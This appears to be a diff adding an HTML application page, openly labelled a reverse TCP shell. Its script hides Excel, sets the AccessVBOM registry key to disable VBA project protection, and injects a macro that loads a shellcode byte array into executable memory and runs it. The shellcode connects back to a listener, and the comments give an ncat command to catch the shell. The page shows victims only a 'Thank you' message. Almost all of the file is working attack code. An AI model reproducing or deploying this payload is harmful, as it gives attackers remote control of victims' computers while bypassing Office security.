@@ -1,0 +1,145 @@
+<html>
+	<head>
+		<script>
+			//This expects a listern at 127.0.0.1:8080
+			//for Example, Launch ncat -lvp 8080 and wait for shell.
+			/*
+				Author: Casey Smith, Twitter: @subTee
+				License: BSD 3-Clause
+				Shellcode Provided by Joshua Pitts
+				Reverse_TCP Shell
+			*/
+			var objExcel = new ActiveXObject("Excel.Application");
+			objExcel.Visible = false;
+			var WshShell = new ActiveXObject("WScript.Shell");
+			var Application_Version = objExcel.Version;//Auto-Detect Version
+			var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM";
+			WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
+			var objWorkbook = objExcel.Workbooks.Add();
+			var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);
+			//Insert Macro Here
+			strCode = '#If VBA7 Then\n'
+			strCode+= 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n'
+			strCode+= 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n'
+			strCode+= 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n'
+			strCode+= 'Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long\n'
+			strCode+= 'Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long\n'
+			strCode+= '#Else\n'
+			strCode+= 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n'
+			strCode+= 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n'
+			strCode+= 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n'
+			strCode+= 'Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long\n'
+			strCode+= 'Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long\n'
+			strCode+= '#End If\n'
+			strCode+= '\n'
+			strCode+= 'Function ptrProcAddress(ByVal funcName As String) As Long\n'
+			strCode+= '    Dim ptrKernel32 As Long\n'
+			strCode+= '    ptrKernel32 = LoadLibrary("kernel32.dll")\n'
+			strCode+= '    Dim ptrProc As Long\n'
+			strCode+= '    ptrProcAddress = GetProcAddress(ptrKernel32, funcName)\n'
+			strCode+= 'End Function\n'
+			strCode+= '\n'
+			strCode+= 'Function hexConvert(ByVal longInput As Long) As String\n'
+			strCode+= '    Dim I As Long \n'
+			strCode+= '    Dim L As Integer \n'
+			strCode+= '    I = longInput\n'
+			strCode+= '    L = 8\n'
+			strCode+= '    hexConvert = Replace(Space(L - Len(Hex(I))), " ", "0") & Hex(I)\n'
+			strCode+= 'End Function\n'
+			strCode+= '\n'
+			strCode+= 'Sub ExecShell()\n'
+			strCode+= '     \n'
+			strCode+= '     Dim ptrGetProcAddress As String, ptrLoadLibrary As String, ptrShellcodeBaseStr As String\n'
+			strCode+= '     Dim A As Integer, B As Integer, C As Integer, D As Integer\n'
+			strCode+= '     Dim E As Integer, F As Integer, G As Integer, H As Integer\n'
+			strCode+= '     Dim I As Integer, J As Integer, K As Integer, L As Integer\n'
+			strCode+= '     \n'
+			strCode+= '     \n'
+			strCode+= '     ptrGetProcAddress = hexConvert(ptrProcAddress("GetProcAddress"))\n'
+			strCode+= '     \n'
+			strCode+= '     A = CLng("&H" & Mid(ptrGetProcAddress, 7, 2))\n'
+			strCode+= '     B = CLng("&H" & Mid(ptrGetProcAddress, 5, 2))\n'
+			strCode+= '     C = CLng("&H" & Mid(ptrGetProcAddress, 3, 2))\n'
+			strCode+= '     D = CLng("&H" & Mid(ptrGetProcAddress, 1, 2))\n'
+			strCode+= '     \n'
+			strCode+= '     \n'
+			strCode+= '     ptrLoadLibrary = hexConvert(ptrProcAddress("LoadLibraryA"))\n'
+			strCode+= '     \n'
+			strCode+= '     E = CLng("&H" & Mid(ptrLoadLibrary, 7, 2))\n'
+			strCode+= '     F = CLng("&H" & Mid(ptrLoadLibrary, 5, 2))\n'
+			strCode+= '     G = CLng("&H" & Mid(ptrLoadLibrary, 3, 2))\n'
+			strCode+= '     H = CLng("&H" & Mid(ptrLoadLibrary, 1, 2))\n'
+			strCode+= '     \n'
+			strCode+= '     \n'
+			strCode+= '    Dim positionRef As Long, ShellcodeArray As Variant, returnCatcher As Long, Counter As Long\n'
+			strCode+= '    #If VBA7 Then\n'
+			strCode+= '            Dim ShellcodeBase As LongPtr\n'
+			strCode+= '    #Else\n'
+			strCode+= '            Dim ShellcodeBase As Long\n'
+			strCode+= '    #End If\n'
+			strCode+= '            \n'
+			strCode+= '            ShellcodeBase = VirtualAlloc(0, 1024, &H1000, &H40)\n'
+			strCode+= '            \n'
+			strCode+= '            ptrShellcodeBaseStr = hexConvert(ShellcodeBase)\n'
+			strCode+= '   \n'
+			strCode+= '            I = CLng("&H" & Mid(ptrShellcodeBaseStr, 7, 2))\n'
+			strCode+= '            J = CLng("&H" & Mid(ptrShellcodeBaseStr, 5, 2))\n'
+			strCode+= '            K = CLng("&H" & Mid(ptrShellcodeBaseStr, 3, 2))\n'
+			strCode+= '            L = CLng("&H" & Mid(ptrShellcodeBaseStr, 1, 2))\n'
+			strCode+= '            \n'
+			strCode+= '            ptrShellcodeBaseStr = hexConvert(ShellcodeBase + 4)\n'
+			strCode+= '           \n'
+			strCode+= '            M = CLng("&H" & Mid(ptrShellcodeBaseStr, 7, 2))\n'
+			strCode+= '            N = CLng("&H" & Mid(ptrShellcodeBaseStr, 5, 2))\n'
+			strCode+= '            O = CLng("&H" & Mid(ptrShellcodeBaseStr, 3, 2))\n'
+			strCode+= '            P = CLng("&H" & Mid(ptrShellcodeBaseStr, 1, 2))\n'
+			strCode+= '            \n'
+			strCode+= '            ptrShellcodeBaseStr = hexConvert(ShellcodeBase + 8)\n'
+			strCode+= '            \n'
+			strCode+= '            Q = CLng("&H" & Mid(ptrShellcodeBaseStr, 7, 2))\n'
+			strCode+= '            R = CLng("&H" & Mid(ptrShellcodeBaseStr, 5, 2))\n'
+			strCode+= '            S = CLng("&H" & Mid(ptrShellcodeBaseStr, 3, 2))\n'
+			strCode+= '            T = CLng("&H" & Mid(ptrShellcodeBaseStr, 1, 2))\n'
+			strCode+= '            \n'
+			strCode+= '            ShellcodeArray = Array(I, J, K, L, A, B, C, D, E, F, G, H, 144, 144, 104, M, N, O, P, 104, Q, R, S, T, _\n'
+			strCode+= '            91, 90, 139, 202, 49, 192, _\n'
+			strCode+= '            104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, 135, 241, 255, 19, 104, 117, 112, 0, 0, _\n'
+			strCode+= '            104, 116, 97, 114, 116, 104, 87, 83, 65, 83, 84, 80, 151, 255, 22, 149, 184, 144, 1, 0, _\n'
+			strCode+= '            0, 41, 196, 84, 80, 255, 213, 104, 116, 65, 0, 0, 104, 111, 99, 107, 101, 104, 87, 83, _\n'
+			strCode+= '            65, 83, 84, 87, 255, 22, 149, 49, 192, 80, 80, 80, 80, 64, 80, 64, 80, 255, 213, 149, _\n'
+			strCode+= '            104, 101, 99, 116, 0, 104, 99, 111, 110, 110, 84, 87, 255, 22, 135, 205, 149, 106, 5, 104, _\n'
+			strCode+= '            127, 0, 0, 1, 104, 2, 0, 31, 144, 137, 226, 106, 16, 82, 81, 135, 249, 255, 213, 133, _\n'
+			strCode+= '            192, 116, 0, 106, 0, 104, 101, 108, 51, 50, 104, 107, 101, 114, 110, 84, 255, 19, 104, 115, _\n'
+			strCode+= '            65, 0, 0, 104, 111, 99, 101, 115, 104, 116, 101, 80, 114, 104, 67, 114, 101, 97, 84, 80, _\n'
+			strCode+= '            255, 22, 149, 147, 104, 99, 109, 100, 0, 137, 227, 87, 87, 87, 135, 254, 146, 49, 246, 106, _\n'
+			strCode+= '            18, 89, 86, 226, 253, 102, 199, 68, 36, 60, 1, 1, 141, 68, 36, 16, 198, 0, 68, 84, _\n'
+			strCode+= '            80, 86, 86, 86, 70, 86, 78, 86, 86, 83, 86, 135, 218, 255, 213, 137, 230, 106, 0, 104, _\n'
+			strCode+= '            101, 108, 51, 50, 104, 107, 101, 114, 110, 84, 255, 19, 104, 101, 99, 116, 0, 104, 101, 79, _\n'
+			strCode+= '            98, 106, 104, 105, 110, 103, 108, 104, 70, 111, 114, 83, 104, 87, 97, 105, 116, 84, 80, 149, _\n'
+			strCode+= '            255, 23, 149, 137, 242, 49, 246, 78, 144, 70, 137, 212, 255, 50, 150, 255, 213, 129, 196, 52, _\n'
+			strCode+= '            2, 0, 0, 157, 97)\n'
+			strCode+= '\n'
+			strCode+= '            \n'
+			strCode+= '            \n'
+			strCode+= '            For Counter = LBound(ShellcodeArray) To UBound(ShellcodeArray)\n'
+			strCode+= '                    positionRef = ShellcodeArray(Counter)\n'
+			strCode+= '                    returnCatcher = RtlMoveMemory(ShellcodeBase + Counter, positionRef, 1)\n'
+			strCode+= '            Next Counter\n'
+			strCode+= '            returnCatcher = CreateThread(0, 0, ShellcodeBase + 12, 0, 0, 0)\n'
+			strCode+= '        \n'
+			strCode+= '    End Sub\n'
+			strCode+= '   \n'
+			
+			//End Macro
+			
+			xlmodule.CodeModule.AddFromString(strCode);
+			objExcel.Run("ExecShell");
+			objExcel.DisplayAlerts = false;
+			objWorkbook.Close(false);
+			close();
+		</script>
+	</head>
+	<body>
+		Thank you. You may close this window.
+	</body>
+</html>
